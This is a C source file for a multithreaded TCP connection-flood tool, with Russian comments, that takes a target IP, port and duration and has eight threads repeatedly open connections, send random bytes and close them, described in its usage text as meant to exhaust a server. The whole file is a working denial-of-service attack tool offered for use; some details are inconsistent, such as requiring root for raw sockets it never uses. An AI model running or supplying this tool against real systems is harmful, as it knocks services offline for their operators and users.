#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <fcntl.h>

// random number generator
static uint32_t x, y, z, w;

void rand_init(void) {
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

// thread data
struct thread_data {
    uint32_t target_ip;
    uint16_t port;
    int duration;
    int thread_id;
};

// tcp handshake flood - полные 3-way handshake
void* handshake_flood_thread(void *arg) {
    struct thread_data *data = (struct thread_data*)arg;
    struct sockaddr_in target;
    int sock;
    int connection_count = 0;
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = data->target_ip;
    target.sin_port = htons(data->port);
    
    printf("thread %d: starting tcp handshake flood\n", data->thread_id);
    
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            // устанавливаем non-blocking
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            // пытаемся подключиться (SYN)
            if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0 || errno == EINPROGRESS) {
                // ждем немного для завершения handshake
                usleep(1000);
                
                // отправляем данные после handshake
                char data_payload[1024];
                memset(data_payload, rand_next() & 0xFF, sizeof(data_payload));
                send(sock, data_payload, sizeof(data_payload), MSG_NOSIGNAL);
                
                // держим соединение некоторое время
                usleep(5000);
                
                connection_count++;
            }
            
            close(sock);
        }
        
        // небольшая задержка между соединениями
        usleep(100);
    }
    
    printf("thread %d: handshake flood finished, connections: %d\n", data->thread_id, connection_count);
    return NULL;
}

void handshake_flood(uint32_t target_ip, uint16_t dport, int duration) {
    printf("tcp handshake flood attack on %s:%d for %d seconds\n", 
           inet_ntoa(*(struct in_addr*)&target_ip), dport, duration);
    
    // создаем 8 потоков для максимальной нагрузки
    pthread_t threads[8];
    struct thread_data thread_data[8];
    
    for (int i = 0; i < 8; i++) {
        thread_data[i].target_ip = target_ip;
        thread_data[i].port = dport;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
        
        pthread_create(&threads[i], NULL, handshake_flood_thread, &thread_data[i]);
    }
    
    // ждем указанное время
    sleep(duration);
    
    // завершаем потоки
    for (int i = 0; i < 8; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }
    
    printf("tcp handshake flood finished\n");
}

void usage(void) {
    printf("usage: handshake_flood -i <target_ip> -p <target_port> -d <seconds>\n");
    printf("purpose: exhausts server with full tcp 3-way handshake connections\n");
    printf("example: handshake_flood -i 192.168.1.1 -p 80 -d 60\n");
}

int main(int argc, char *argv[]) {
    uint32_t target_ip = 0;
    uint16_t port = 0;
    int duration = 0;
    int opt;
    
    if (argc != 7) {
        usage();
        return 1;
    }
    
    while ((opt = getopt(argc, argv, "i:p:d:")) != -1) {
        switch (opt) {
            case 'i':
                target_ip = inet_addr(optarg);
                if (target_ip == INADDR_NONE) {
                    printf("invalid ip address: %s\n", optarg);
                    return 1;
                }
                break;
            case 'p':
                port = atoi(optarg);
                if (port == 0) {
                    printf("invalid port: %s\n", optarg);
                    return 1;
                }
                break;
            case 'd':
                duration = atoi(optarg);
                if (duration <= 0) {
                    printf("invalid duration: %s\n", optarg);
                    return 1;
                }
                break;
            default:
                usage();
                return 1;
        }
    }
    
    if (target_ip == 0 || port == 0 || duration == 0) {
        usage();
        return 1;
    }
    
    if (getuid() != 0) {
        printf("error: must run as root for raw sockets\n");
        return 1;
    }
    
    rand_init();
    handshake_flood(target_ip, port, duration);
    
    return 0;
}
